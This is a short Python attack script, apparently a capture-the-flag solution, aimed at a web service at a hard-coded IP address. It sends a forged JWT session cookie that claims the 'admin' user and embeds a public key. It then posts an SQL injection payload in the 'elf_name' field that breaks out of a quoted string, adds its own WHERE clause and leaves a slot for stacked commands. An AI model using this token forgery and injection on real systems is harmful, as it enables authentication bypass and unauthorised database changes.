import requests as rq

url = 'http://138.68.136.191:32177'
cookie = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxNXFwZzVMWXppYVJSb2VneHdZYVxuSDg2bFJqTWJ3MHdLMUZZRHZoa293TlhOcHcvdFIzT1MwdlFvUDhYKzdCem1HNElvZ1N6bDFxbFp1c01tZDBUbFxuMy9RQ2NTZWRBaHJ4VlhSK0QvMGV0bWtNM3h4YU5GVnYvSDhyQ01sMFNnb0ZzdUphRUh1eTdIaXRxaldVVTcvdVxuVzNSamZsYXJ0U3prS2ZqWVkvNThCZ085WHFiSGRiV1gwZmNNOXAyVnV0SmsrRXJPWWZFU0xncjV1allaWDFtNFxuSWMxYVJrOU9zTUVWaW4rY3VxTGFIMFNwRk9PZ2EwNUFVT1Vyc25qd2NZZXhJNlgwTXJYVjFjRmdRN1RaZDZmRVxuTmk2bHJZYjc3UCtTbXFnNlBFMHZzWWtoRDN0bzR2OWFnNStNa2hEOWJtdG1tZ0U3TVcvTm5SZVNUSTAwTHVIUVxuandJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcxNzI3Nn0.GfUvGB9Wq95cTcNGOfcF7I69OxBfOW4vDGQca6jcfo8'

s = rq.Session()
s.headers = {'Cookie': f'session={cookie}'}

#res = s.get(url)
#print(res.text)

def edit(data):
	res = s.post(url+'/api/elf/edit', json=data)
	print(res.text)

cmd = ''
data = {
	"elf_name":   '"abc, type = nice WHERE id = 6;' + cmd + '-- -',
	"type":       "naughty",
	"editelf_id": "6"
}

edit(data)
